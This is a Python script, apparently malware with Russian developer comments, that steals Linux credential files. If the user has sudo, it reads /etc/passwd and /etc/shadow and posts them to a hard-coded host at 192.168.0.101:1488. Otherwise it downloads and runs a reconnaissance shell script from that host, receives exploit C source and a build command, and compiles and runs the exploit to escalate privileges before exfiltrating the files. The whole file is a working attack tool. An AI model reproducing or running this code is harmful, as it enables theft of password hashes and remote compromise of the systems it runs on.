import urllib3
from subprocess import Popen, PIPE
import os
import json


is_sudo = 1 if 'sudo' in str(os.popen('groups ${whoami}').read()) else 0

script = """
import urllib3
from urllib.parse import urlencode
import json

http = urllib3.PoolManager()
with open('/etc/passwd', 'r', encoding='utf-8') as pwd:
    passwords = pwd.read()

with open('/etc/shadow', 'r', encoding='utf-8') as shadow:
    sh = shadow.read()

data = {'shadow': sh,
        'passwd': passwords}
http.request('POST',
             'http://192.168.0.101:1488/health', body=json.dumps(data),
             headers={'Content-Type': 'application/json'}
             )
"""
# чекаем вперсию которой можем стартануть
python_ver = 'python3' if 'not found' not in os.popen('python3 --version').read() else 'python'
sudo_password = '1'  # вынести в конфиг фласка, сделать рендер через jinja


def send_request(method, uri, data=None):
    """Обвязка для реквеста
    :method: str[GET, POST]
    :uri: str = ручка из сервера фласка
    data: json который хотим отдать
    """
    http_manager = urllib3.PoolManager()
    body = None
    if data:
        body = json.dumps(data)
    return http_manager.request(method,
                                f'http://192.168.0.101:1488/{uri}',  # сделать генерируемый!
                                body=body,
                                headers={'Content-Type': 'application/json'}
                                )


def sudo_run(command, password=sudo_password):
    # делаем что-то с sudo
    with Popen(command, stdin=PIPE, stderr=PIPE, universal_newlines=True) as p:
        p.communicate(password + '\n')[1]


def _send_hack(command, pwd):
    # временное решение
    with open('sc.py', 'w', encoding='utf-8') as sc:
        sc.write(script)
    sudo_run(command, pwd)


if 'sudo' in str(is_sudo):
    # если у нас есть судогруппа, то сразу забираем файлы и уходим
    cmd = ['sudo', python_ver, './sc.py']
    _send_hack(cmd, sudo_password)


if 'sudo' not in str(is_sudo):
    print('Run without sudo')
    http = urllib3.PoolManager()
    # получаем скрипт на поиск возможных эксплойтов
    res = http.request('GET',
                       'http://192.168.0.101:1488/',
                       headers={'Content-Type': 'application/json'}
                       )

    # собираем скрипт и отправляем информацию обратно для получение сурса эксплойта
    with open('./ck.sh', 'w', encoding='utf-8') as f:
        f.write(str(res.data.decode('utf-8')))
    os.system('chmod +x ./ck.sh')
    res = os.popen("./ck.sh").read()
    req = send_request('POST', 'data', {'result': res})

    with open('exp.c', 'w', encoding='utf-8') as exp:
        exp.write(req.data.decode('utf-8'))

    # билдим и выполняем эксплойт
    os.popen(f'{req.headers["command"]}')
    os.popen('chmod +x ./exp').read()
    os.popen('./exp').close()
    cmd = ['sudo', python_ver, './sc.py']
    # вот тут чет факапит иногда, надо понять из-за чего

    _send_hack(cmd, sudo_password)
